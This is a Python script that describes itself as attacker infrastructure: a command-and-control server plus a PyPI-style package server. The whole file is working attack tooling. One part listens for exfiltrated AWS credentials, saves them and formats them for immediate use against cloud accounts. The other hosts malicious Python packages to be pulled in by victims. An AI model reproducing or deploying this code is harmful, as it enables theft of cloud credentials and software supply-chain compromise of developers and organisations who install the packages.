#!/usr/bin/env python3
"""
C2 Server with Integrated PyPI Server
Serves malicious packages AND receives stolen credentials
"""
import socket
import threading
import datetime
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json


class C2Handler:
    """Handles incoming stolen credentials"""
    
    def __init__(self, port=443):
        self.port = port
        self.stolen_creds = []
        
    def start(self):
        """Start C2 listener for credential exfiltration"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", self.port))
        server.listen(5)
        
        print(f"[C2] Credential receiver listening on port {self.port}")
        print("[C2] Waiting for stolen AWS credentials...")
        
        while True:
            try:
                client, addr = server.accept()
                print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
                
                data = client.recv(8192).decode('utf-8', errors='ignore')
                
                if data.startswith("STOLEN_AWS_CREDS:"):
                    self.handle_stolen_creds(data, addr[0])
                
                client.close()
            except Exception as e:
                print(f"[-] Error handling connection: {e}")
    
    def handle_stolen_creds(self, data, source_ip):
        """Process and save stolen AWS credentials"""
        creds = data.replace("STOLEN_AWS_CREDS:", "")
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        print(f"[+] AWS Credentials stolen from {source_ip}!")
        print("[+] Extracting access keys...")
        
        # Save raw credentials
        raw_file = f"stolen_creds_{timestamp}_{source_ip}.txt"
        with open(raw_file, "w") as f:
            f.write(f"Source: {source_ip}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write("=" * 60 + "\n")
            f.write(creds)
        
        print(f"[+] Raw credentials saved: {raw_file}")
        
        # Parse and prepare for AWS CLI
        try:
            if "[CREDENTIALS]" in creds:
                creds_section = creds.split("[CREDENTIALS]\n")[1]
                if "[CONFIG]" in creds_section:
                    creds_section = creds_section.split("[CONFIG]")[0]
                
                # Save in AWS credentials format
                aws_creds_file = "stolen_aws_credentials"
                with open(aws_creds_file, "w") as f:
                    f.write(creds_section.strip())
                
                print(f"[+] AWS credentials ready: {aws_creds_file}")
                print("[+] Use with: export AWS_SHARED_CREDENTIALS_FILE=$(pwd)/stolen_aws_credentials")
                
                # Extract access key for logging
                for line in creds_section.split('\n'):
                    if 'aws_access_key_id' in line.lower():
                        key_id = line.split('=')[1].strip()
                        print(f"[+] Access Key ID: {key_id}")
                        break
                
                self.stolen_creds.append({
                    'timestamp': timestamp,
                    'source_ip': source_ip,
                    'file': raw_file
                })
                
                print("\n[SUCCESS] Credentials ready for cloud attack phase!")
                print("=" * 60)
                
        except Exception as e:
            print(f"[-] Error parsing credentials: {e}")


class PyPIServer:
    """Simple PyPI server to host malicious packages"""
    
    def __init__(self, port=80, packages_dir="packages"):
        self.port = port
        self.packages_dir = packages_dir
        os.makedirs(packages_dir, exist_ok=True)
        os.makedirs(os.path.join(packages_dir, "simple"), exist_ok=True)
        
    def start(self):
        """Start PyPI server"""
        os.chdir(self.packages_dir)
        
        class CustomHandler(SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                print(f"[PyPI] {self.client_address[0]} - {format % args}")
        
        server = HTTPServer(("0.0.0.0", self.port), CustomHandler)
        print(f"[PyPI] Package server listening on port {self.port}")
        print(f"[PyPI] Serving packages from: {os.path.abspath(self.packages_dir)}")
        server.serve_forever()


def main():
    """Start both C2 and PyPI servers"""
    print("=" * 60)
    print("  ATTACKER INFRASTRUCTURE - C2 + PyPI Server")
    print("=" * 60)
    
    # Get server IP
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"\n[*] Server IP: {local_ip}")
    print(f"[*] PyPI URL: http://{local_ip}/simple/")
    print(f"[*] C2 Port: 443")
    print()
    
    # Start PyPI server in separate thread
    pypi = PyPIServer(port=80)
    pypi_thread = threading.Thread(target=pypi.start, daemon=True)
    pypi_thread.start()
    
    # Start C2 listener in main thread
    c2 = C2Handler(port=443)
    c2.start()


if __name__ == "__main__":
    main()
